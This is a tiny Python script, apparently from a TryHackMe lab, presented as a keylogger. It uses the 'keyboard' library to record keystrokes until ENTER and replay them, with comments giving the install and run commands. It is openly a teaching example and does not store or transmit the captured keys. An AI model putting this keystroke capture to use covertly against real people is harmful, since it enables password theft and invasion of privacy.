#TryHackMe.com
#pip3 install keyboard   
#python3 keylogger.py

import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
